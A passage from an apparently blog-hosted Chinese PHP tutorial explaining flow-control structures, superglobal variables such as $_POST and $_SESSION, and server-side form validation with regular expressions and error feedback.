true</span></span><br></pre></td></tr></table></figure></li><li><p><strong>安全处理 <code>null</code> 和空值</strong>：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$var</span> !== <span class="literal">null</span> &amp;&amp; <span class="variable">$var</span> !== <span class="string">&quot;&quot;</span>) &#123; <span class="comment">/* 确保值非空且类型正确 */</span> &#125;</span><br></pre></td></tr></table></figure></li></ol><hr><h1 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h1><h4 id="一、流程控制的三大结构"><a href="#一、流程控制的三大结构" class="headerlink" title="一、流程控制的三大结构"></a>一、<strong>流程控制的三大结构</strong></h4><ol><li><p><strong>顺序结构</strong><br>• 代码从上到下依次执行，无分支或跳转。<br>• 示例：</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Step 1&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Step 2&quot;</span>;</span><br></pre></td></tr></table></figure></li><li><p><strong>选择结构</strong><br>• 根据条件判断决定执行哪段代码。<br>• <strong>常用语句</strong>：<code>if</code>、<code>if-else</code>、<code>switch-case</code>。</p></li><li><p><strong>循环结构</strong><br>• 重复执行某段代码，直到满足退出条件。<br>• <strong>常用语句</strong>：<code>while</code>、<code>do-while</code>、<code>for</code>、<code>foreach</code>。</p></li></ol><hr><h4 id="二、选择结构详解"><a href="#二、选择结构详解" class="headerlink" title="二、选择结构详解"></a>二、<strong>选择结构详解</strong></h4><ol><li><p><strong><code>if</code> 语句</strong><br>• 语法：</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (条件) &#123;</span><br><span class="line">    <span class="comment">// 条件为真时执行的代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>• <strong>示例</strong>：</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$age</span> = <span class="number">18</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$age</span> &gt;= <span class="number">18</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;成年了&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong><code>if-else</code> 语句</strong><br>• 语法：</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (条件) &#123;</span><br><span class="line">    <span class="comment">// 条件为真时执行</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 条件为假时执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>• <strong>示例</strong>：</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$score</span> = <span class="number">85</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$score</span> &gt;= <span class="number">60</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;及格&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;不及格&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong><code>switch-case</code> 语句</strong><br>• 语法：</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (表达式) &#123;</span><br><span class="line">    <span class="keyword">case</span> 值<span class="number">1</span>:</span><br><span class="line">        <span class="comment">// 匹配值1时执行</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> 值<span class="number">2</span>:</span><br><span class="line">        <span class="comment">// 匹配值2时执行</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="comment">// 无匹配时执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>• <strong>示例</strong>：</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$grade</span> = <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$grade</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;优秀&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;良好&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;需努力&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>• <strong>注意</strong>：<code>break</code> 用于跳出 <code>switch</code>，否则会继续执行后续 <code>case</code>（<strong>case穿透</strong>）。</p></li></ol><hr><h4 id="三、循环结构详解"><a href="#三、循环结构详解" class="headerlink" title="三、循环结构详解"></a>三、<strong>循环结构详解</strong></h4><ol><li><p><strong><code>while</code> 循环</strong><br>• 语法：</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (条件) &#123;</span><br><span class="line">    <span class="comment">// 条件为真时重复执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>• <strong>示例</strong>：</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$i</span> &lt; <span class="number">5</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$i</span>; <span class="comment">// 输出 0,1,2,3,4</span></span><br><span class="line">    <span class="variable">$i</span>++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>• <strong>风险</strong>：若条件始终为真，会导致<strong>死循环</strong>。</p></li><li><p><strong><code>do-while</code> 循环</strong><br>• 语法：</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="comment">// 先执行一次，再判断条件</span></span><br><span class="line">&#125; <span class="keyword">while</span> (条件);</span><br></pre></td></tr></table></figure><p>• <strong>示例</strong>：</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$i</span>; <span class="comment">// 至少输出一次</span></span><br><span class="line">    <span class="variable">$i</span>++;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="variable">$i</span> &lt; <span class="number">5</span>);</span><br></pre></td></tr></table></figure></li><li><p><strong><code>for</code> 循环</strong><br>• 语法：</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (初始化; 条件; 增量) &#123;</span><br><span class="line">    <span class="comment">// 循环体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>• <strong>示例</strong>：</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">5</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$i</span>; <span class="comment">// 输出 0,1,2,3,4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong><code>foreach</code> 循环</strong><br>• 专用于遍历数组或对象。<br>• 语法：</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="comment">// 遍历数组元素</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>• <strong>示例</strong>：</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$arr</span> = [<span class="string">&quot;a&quot;</span> =&gt; <span class="string">&quot;apple&quot;</span>, <span class="string">&quot;b&quot;</span> =&gt; <span class="string">&quot;banana&quot;</span>];</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$key</span>: <span class="subst">$value</span>&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><hr><h4 id="四、循环控制关键字"><a href="#四、循环控制关键字" class="headerlink" title="四、循环控制关键字"></a>四、<strong>循环控制关键字</strong></h4><ol><li><p><strong><code>break</code></strong><br>• <strong>作用</strong>：立即终止当前循环。<br>• <strong>示例</strong>：</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">10</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$i</span> == <span class="number">5</span>) &#123;</span><br><span class="line">        <span class="keyword">break</span>; <span class="comment">// 当 $i=5 时退出循环</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$i</span>; <span class="comment">// 输出 0,1,2,3,4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong><code>continue</code></strong><br>• <strong>作用</strong>：跳过当前循环的剩余代码，进入下一次循环。<br>• <strong>示例</strong>：</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">10</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$i</span> == <span class="number">5</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>; <span class="comment">// 跳过 $i=5 的输出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$i</span>; <span class="comment">// 输出 0,1,2,3,4,6,7,8,9</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><hr><h4 id="五、流程控制综合示例"><a href="#五、流程控制综合示例" class="headerlink" title="五、流程控制综合示例"></a>五、<strong>流程控制综合示例</strong></h4><ol><li><p><strong>猜数字游戏</strong>（结合 <code>if-else</code> 和循环）：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$secretNumber</span> = <span class="number">7</span>;</span><br><span class="line"><span class="variable">$guess</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$guess</span> != <span class="variable">$secretNumber</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;请输入猜测的数字：&quot;</span>;</span><br><span class="line">    <span class="variable">$guess</span> = (<span class="keyword">int</span>)<span class="title function_ invoke__">readline</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$guess</span> &lt; <span class="variable">$secretNumber</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;太小了！</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="variable">$guess</span> &gt; <span class="variable">$secretNumber</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;太大了！</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;恭喜猜对了！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>数组去重</strong>（结合 <code>foreach</code> 和条件判断）：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$array</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="variable">$uniqueArray</span> = [];</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$value</span>, <span class="variable">$uniqueArray</span>)) &#123;</span><br><span class="line">        <span class="variable">$uniqueArray</span>[] = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$uniqueArray</span>); <span class="comment">// 输出 [1,2,3,4,5]</span></span><br></pre></td></tr></table></figure></li></ol><hr><h4 id="六、关键总结"><a href="#六、关键总结" class="headerlink" title="六、关键总结"></a>六、<strong>关键总结</strong></h4><table><thead><tr><th>结构类型</th><th>关键字&#x2F;语法</th><th>核心用途</th><th>注意事项</th></tr></thead><tbody><tr><td><strong>顺序结构</strong></td><td>无</td><td>按顺序执行代码</td><td>无额外逻辑</td></tr><tr><td><strong>选择结构</strong></td><td><code>if</code>, <code>switch</code></td><td>根据条件选择执行路径</td><td>避免嵌套过多，使用 <code>else if</code> 优化可读性</td></tr><tr><td><strong>循环结构</strong></td><td><code>while</code>, <code>for</code>, <code>foreach</code></td><td>重复执行代码块</td><td>防止死循环，合理使用 <code>break</code> 和 <code>continue</code></td></tr></tbody></table><h1 id="超全局变量"><a href="#超全局变量" class="headerlink" title="超全局变量"></a>超全局变量</h1><h4 id="一、超全局变量的定义"><a href="#一、超全局变量的定义" class="headerlink" title="一、超全局变量的定义"></a>一、<strong>超全局变量的定义</strong></h4><p>• <strong>概念</strong>：超全局变量是 PHP 内置的全局变量，在脚本的任何作用域（函数、类、方法）中均可直接访问，无需通过 <code>global</code> 关键字声明。<br>• <strong>特点</strong>：<br>  • 全局可见性：所有函数、类、方法均可直接使用。<br>  • 预定义：PHP 已内置多个超全局变量，用于处理请求、服务器信息、环境变量等。</p><hr><h4 id="二、常用超全局变量及用途"><a href="#二、常用超全局变量及用途" class="headerlink" title="二、常用超全局变量及用途"></a>二、<strong>常用超全局变量及用途</strong></h4><h5 id="1-GLOBALS"><a href="#1-GLOBALS" class="headerlink" title="1. $GLOBALS"></a>1. <strong><code>$GLOBALS</code></strong></h5><p>• <strong>作用</strong>：存储所有全局变量的关联数组，键为变量名，值为变量值。<br>• <strong>示例</strong>：</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$x</span> = <span class="number">10</span>;</span><br><span class="line"><span class="variable">$y</span> = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$GLOBALS</span>[<span class="string">&#x27;z&#x27;</span>] = <span class="variable">$GLOBALS</span>[<span class="string">&#x27;x&#x27;</span>] + <span class="variable">$GLOBALS</span>[<span class="string">&#x27;y&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">sum</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$z</span>; <span class="comment">// 输出 30</span></span><br></pre></td></tr></table></figure><h5 id="2-POST"><a href="#2-POST" class="headerlink" title="2. $_POST"></a>2. <strong><code>$_POST</code></strong></h5><p>• <strong>作用</strong>：收集通过 <strong>POST 方法</strong>提交的表单数据。<br>• <strong>特点</strong>：<br>  • 数据不显示在 URL 中，安全性较高。<br>  • 适用于传输敏感信息（如密码）。<br>• <strong>示例</strong>：</p>  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 表单提交方式为 POST --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;process.php&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// process.php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]; <span class="comment">// 获取表单提交的用户名</span></span><br></pre></td></tr></table></figure><h5 id="3-GET"><a href="#3-GET" class="headerlink" title="3. $_GET"></a>3. <strong><code>$_GET</code></strong></h5><p>• <strong>作用</strong>：收集通过 <strong>GET 方法</strong>提交的表单数据。<br>• <strong>特点</strong>：<br>  • 数据附加在 URL 后（如 <code>?name=value</code>），可见且不安全。<br>  • 适用于非敏感数据（如搜索关键词）。<br>• <strong>示例</strong>：</p>  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 表单提交方式为 GET --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span> <span class="attr">action</span>=<span class="string">&quot;search.php&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;keyword&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// search.php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;keyword&#x27;</span>]; <span class="comment">// 获取 URL 中的关键词</span></span><br></pre></td></tr></table></figure><h5 id="4-REQUEST"><a href="#4-REQUEST" class="headerlink" title="4. $_REQUEST"></a>4. <strong><code>$_REQUEST</code></strong></h5><p>• <strong>作用</strong>：合并 <code>$_POST</code> 和 <code>$_GET</code> 的数据，兼容两种提交方式。<br>• <strong>注意</strong>：因安全性问题，建议优先使用 <code>$_POST</code> 或 <code>$_GET</code>。</p><h5 id="5-SERVER"><a href="#5-SERVER" class="headerlink" title="5. $_SERVER"></a>5. <strong><code>$_SERVER</code></strong></h5><p>• <strong>作用</strong>：存储服务器和请求的环境信息，如请求方法、路径、客户端 IP 等。<br>• <strong>常用键</strong>：<br>  • <code>$_SERVER[&#39;REQUEST_METHOD&#39;]</code>：请求方法（GET&#x2F;POST）。<br>  • <code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code>：客户端 IP 地址。<br>  • <code>$_SERVER[&#39;SCRIPT_NAME&#39;]</code>：当前脚本路径。</p><h5 id="6-COOKIE"><a href="#6-COOKIE" class="headerlink" title="6. $_COOKIE"></a>6. <strong><code>$_COOKIE</code></strong></h5><p>• <strong>作用</strong>：存储通过 Cookie 传递的数据。<br>• <strong>示例</strong>：</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置 Cookie</span></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;Alice&quot;</span>, <span class="title function_ invoke__">time</span>() + <span class="number">3600</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取 Cookie</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]; <span class="comment">// 输出 &quot;Alice&quot;</span></span><br></pre></td></tr></table></figure><h5 id="7-SESSION"><a href="#7-SESSION" class="headerlink" title="7. $_SESSION"></a>7. <strong><code>$_SESSION</code></strong></h5><p>• <strong>作用</strong>：存储会话数据，跨页面共享。<br>• <strong>示例</strong>：</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>] = <span class="number">123</span>; <span class="comment">// 存储会话数据</span></span><br></pre></td></tr></table></figure>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 其他页面</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>]; <span class="comment">// 输出 123</span></span><br></pre></td></tr></table></figure><h5 id="8-ENV"><a href="#8-ENV" class="headerlink" title="8. $_ENV"></a>8. <strong><code>$_ENV</code></strong></h5><p>• <strong>作用</strong>：存储通过环境变量传递的数据（如服务器配置）。</p><hr><h4 id="三、超全局变量的使用场景"><a href="#三、超全局变量的使用场景" class="headerlink" title="三、超全局变量的使用场景"></a>三、<strong>超全局变量的使用场景</strong></h4><table><thead><tr><th>场景</th><th>推荐使用的超全局变量</th><th>原因</th></tr></thead><tbody><tr><td>处理表单提交</td><td><code>$_POST</code> &#x2F; <code>$_GET</code></td><td>安全性高（POST）或简单传递（GET）</td></tr><tr><td>获取客户端信息</td><td><code>$_SERVER</code></td><td>如 IP 地址、请求方法</td></tr><tr><td>跨页面数据共享</td><td><code>$_SESSION</code></td><td>数据持久化，安全性高</td></tr><tr><td>临时存储用户偏好</td><td><code>$_COOKIE</code></td><td>数据持久化，但安全性较低</td></tr></tbody></table><hr><h4 id="四、注意事项-1"><a href="#四、注意事项-1" class="headerlink" title="四、注意事项"></a>四、<strong>注意事项</strong></h4><ol><li><strong>安全性</strong>：<br>• 避免直接输出 <code>$_GET</code> 或 <code>$_POST</code> 数据（可能含恶意代码），需过滤和验证。<br>• 使用 <code>htmlspecialchars()</code> 或 <code>filter_input()</code> 处理用户输入。</li><li><strong>表单提交优先级</strong>：<br>• 表单默认提交方式为 <code>GET</code>，需显式设置 <code>method=&quot;post&quot;</code>。</li><li><strong>Cookie 与 Session</strong>：<br>• 使用 <code>session_start()</code> 开启会话。<br>• Cookie 需设置过期时间，否则浏览器关闭后失效。</li></ol><hr><h4 id="五、实战示例：表单处理"><a href="#五、实战示例：表单处理" class="headerlink" title="五、实战示例：表单处理"></a>五、<strong>实战示例：表单处理</strong></h4><ol><li><p><strong>HTML 表单（<code>index.html</code>）</strong>：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;process.php&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>用户名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>PHP 处理脚本（<code>process.php</code>）</strong>：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;欢迎, &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$username</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h1 id="PHP-表单校验"><a href="#PHP-表单校验" class="headerlink" title="PHP 表单校验"></a>PHP 表单校验</h1><h4 id="一、表单校验的核心目标"><a href="#一、表单校验的核心目标" class="headerlink" title="一、表单校验的核心目标"></a>一、<strong>表单校验的核心目标</strong></h4><ol><li><strong>数据合法性</strong>：确保用户输入符合业务规则（如邮箱格式、密码强度）。</li><li><strong>安全性</strong>：防止恶意数据提交（如 SQL 注入、XSS 攻击）。</li><li><strong>用户体验</strong>：通过前端校验减少无效请求，后端校验保障数据安全。</li></ol><hr><h4 id="二、前后端校验分工"><a href="#二、前后端校验分工" class="headerlink" title="二、前后端校验分工"></a>二、<strong>前后端校验分工</strong></h4><table><thead><tr><th>场景</th><th>前端校验（JS）</th><th>后端校验（PHP）</th></tr></thead><tbody><tr><td><strong>目的</strong></td><td>提升用户体验，即时反馈</td><td>保障数据安全，防止非法数据入库</td></tr><tr><td><strong>典型场景</strong></td><td>输入框实时校验（如密码强度）</td><td>表单提交后的完整性、合法性校验</td></tr><tr><td><strong>局限性</strong></td><td>可绕过（用户禁用 JS）</td><td>必须执行，无法绕过</td></tr></tbody></table><hr><h4 id="三、后端校验实现步骤"><a href="#三、后端校验实现步骤" class="headerlink" title="三、后端校验实现步骤"></a>三、<strong>后端校验实现步骤</strong></h4><h5 id="1-获取表单数据"><a href="#1-获取表单数据" class="headerlink" title="1. 获取表单数据"></a>1. <strong>获取表单数据</strong></h5><p>• 使用超全局变量 <code>$_POST</code> 接收表单提交的数据：</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$email</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$mobile</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;mobile&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure><h5 id="2-校验逻辑"><a href="#2-校验逻辑" class="headerlink" title="2. 校验逻辑"></a>2. <strong>校验逻辑</strong></h5><p>• <strong>必填项检查</strong>：</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$email</span>)) &#123;</span><br><span class="line">    <span class="variable">$errors</span>[] = <span class="string">&quot;邮箱为必填项&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$mobile</span>)) &#123;</span><br><span class="line">    <span class="variable">$errors</span>[] = <span class="string">&quot;手机号为必填项&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>• <strong>邮箱格式校验（正则表达式）</strong>：</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[a-zA-Z0-9_]+@[a-zA-Z0-9_]+\.[a-zA-Z]&#123;2,&#125;$/&quot;</span>, <span class="variable">$email</span>)) &#123;</span><br><span class="line">    <span class="variable">$errors</span>[] = <span class="string">&quot;邮箱格式不合法&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>• <strong>手机号格式校验</strong>：</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^1[3-9]\d&#123;9&#125;$/&quot;</span>, <span class="variable">$mobile</span>)) &#123;</span><br><span class="line">    <span class="variable">$errors</span>[] = <span class="string">&quot;手机号格式不合法&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>• <strong>密码复杂度校验</strong>：</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^\w&#123;6,&#125;$/&quot;</span>, <span class="variable">$password</span>)) &#123;</span><br><span class="line">    <span class="variable">$errors</span>[] = <span class="string">&quot;密码需6位及以上（字母/数字/下划线）&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="3-错误处理与反馈"><a href="#3-错误处理与反馈" class="headerlink" title="3. 错误处理与反馈"></a>3. <strong>错误处理与反馈</strong></h5><p>• <strong>收集错误信息</strong>：</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$errors</span> = [];</span><br><span class="line"><span class="comment">// 校验逻辑...</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$errors</span>)) &#123;</span><br><span class="line">    <span class="comment">// 返回错误到前端</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;status&quot;</span> =&gt; <span class="string">&quot;error&quot;</span>, <span class="string">&quot;errors&quot;</span> =&gt; <span class="variable">$errors</span>]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>• <strong>前端展示错误</strong>：</p>  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// AJAX 提交表单后处理响应</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;index.php&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    